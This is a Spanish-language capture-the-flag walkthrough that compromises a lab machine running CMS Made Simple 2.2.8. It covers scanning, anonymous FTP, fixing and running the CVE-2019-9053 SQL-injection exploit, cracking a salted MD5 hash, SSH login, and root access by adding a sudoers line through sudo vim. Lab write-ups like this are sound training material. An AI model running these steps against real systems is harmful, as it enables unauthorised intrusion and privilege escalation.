1. **Ejecutamos un escaneo con Nmap:**
```bash
nmap -sV [target IP]
```
--> Vemos que están abiertos los puertos 21 (FTP), 80 (HTTP) y 2222 (SSH)

2. **Entramos como Anonymous en el FTP**
--> Obtenemos un archivo llamado *ForMitch.txt* que dice:
"Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!"

De aquí podemos deducir por el título que hay alguien (probablemente algún usuario) que se llame Mitch.

3. **Entramos en la IP desde el navegador**
--> Vemos la pantalla principal de Apache

4. **Hacemos un descubrimiento de subdominios para ver si hay algo más en la web:**
```bash
gobuster dir -u http://[target IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
--> Encontramos un directorio /simple.

5. **Entramos en el directorio encontrado y vemos que es un CMS Made Simple, versión 2.2.8**

6. **Buscamos este CMS y esta versión en exploitdb con searchsploit:**
```bash
searchsploit cms made simple 2.2.8
```
--> Obtenemos que existe una vulnerabilidad de SQLi para los CMS Made Simple menores de 2.2.10 y que existe un exploit para explotar esta vulnerabilidad en php/webapps/46635.py.

7. **Obtenemos más información sobre el exploit:**
```bash
searchsploit -x php/webapps/46635.py
```
--> Obtenemos que este exploit corresponde al CVE-2019-9053

8. **Nos descargamos el exploit:**
```bash
searchsploit -m php/webapps/46635.py
```

9. **Como está escrito para Python2, lo pasamos a Python3 en la siguiente web: https://python2to3.com/**

10. **Para dejar 100% operativo el exploit, tenemos que hacer 2 pequeños cambios:**
Esta línea:
```python
dict = open(wordlist)
```
La cambiaremos a esta:
```python
dict = open(wordlist, "r", encoding="latin-1", errors="ignore")
```
Ya que vamos a usar el diccionario de contraseñas rockyou.txt y tiene caracteres que UTF-8 no es capaz de leer.

Y esta línea:
```python
if hashlib.md5(str(salt) + line).hexdigest() == password:
```
La cambiaremos a esta:
```python
if hashlib.md5((salt + line).encode()).hexdigest() == password:
```
Porque en Python3, `hashlib.md5` no acepta strings, solo bytes y además hay que poner el `.encode()` para que el hash coincida.

11. **Ejecutamos el exploit contra el CMS:**
```bash
python3 -u http://[target IP]/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```
--> Nos encuentra el usuario (`Mitch`, como deducimos al principio del CTF), el email (`admin@admin.com`), el hash de la contraseña, la salt de la contraseña y la contraseña (`secret`).

Con la salt y el hash podríamos haberla crackeado con John The Ripper por ejemplo. En John The Ripper, esto es un MD5 con salt y corresponde al formato `dynamic_4 --> (md5($p.$s))`.
Vamos a probarlo:
-  El hash de la contraseña es `0c01f4468bd75d7a84c7eb73846e8d96` y la salt de la contraseña es `1dac0d92e9fa6bb2`.
- La estructura de esto es: `usuario:$dynamic_4$HASH$SALT`.
- Crearemos un archivo llamado `hash.txt` que contenga: `mitch:$dynamic_4$0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2`
- Ejecutaremos John The Ripper con la wordlist rockyou.txt:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Vemos la salida, es decir, la contraseña crackeada:
```bash
john --show hash.txt
```
--> Obtenemos también la contraseña `secret` para el usuario `mitch`

12. **Vamos a probar estas credenciales en el servicio SSH que tienen abierto en el puerto 2222:**
```bash
ssh -p 2222 mitch@[target IP]
```
--> **MACHINE PWNED!**
--> Hemos logrado acceso al sistema

13. **Obtenemos la flag de usuario en el mismo directorio en el que estamos, en la carpeta de usuario de Mitch. El archivo se llama `user.txt`**

14. **Nos  movemos por la máquina y vemos que hay otro usuario llamado Sunbath, pero no podemos acceder a su carpeta**

15. **Hacemos `sudo -l` para ver los comandos que podemos hacer como usuario privilegiado y vemos que podemos usar `vim`:
- Abro el archivo `/etc/sudoers` con `vim`
- Le doy a la tecla `I` para Insertar
- Inserto debajo de la de `root`, una línea con `mitch   ALL=(ALL:ALL) ALL`
- Le doy al Escape para salirme del modo Insert
- Guardo y cierro el archivo. Pongo la exclamación porque supuestamente es un archivo de solo lectura, pero con la exclamación obligo a que se escriba. Para hacer esto, escribo `:wq!` y le doy a Intro
--> **ROOT!**

Ya tenemos permisos de superusuario. Ahora solo faltaría entrar en la carpeta personal del usuario `root` para obtener la flag de `root`.
